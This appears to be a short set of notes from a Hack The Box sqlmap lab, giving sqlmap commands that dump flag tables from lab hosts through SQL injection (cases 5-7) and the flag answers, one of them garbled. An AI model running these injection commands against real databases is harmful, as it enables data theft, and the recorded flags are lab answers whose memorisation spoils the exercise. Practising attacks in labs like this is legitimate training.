# Questions

#### Case 5:
```go
sqlmap -u 'http://154.57.164.73:30596/case5.php?id=*' --dump --batch -T flag5 --level 5 --risk 3 
```

Answer:
```go
HTB{700a\x02Auch_r15k_bu7_w0r7h_17}
```

```go
HTB{700_much_r15k_bu7_w0r7h_17}
```

#### Case 6: Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries

```go
sqlmap -u 'http://154.57.164.67:30654/case6.php?col=id' --dump --batch -T flag6 --prefix='`)'
```

Answer:
```go
HTB{v1nc3_mcm4h0n_15_4570n15h3d}
```

####  Case 7: What's the contents of table flag7? (Case #7)

```go
sqlmap -u 'http://154.57.164.79:30347/case7.php?id=1' --dump --batch -T flag7 --union-cols=5 --union-from=users
```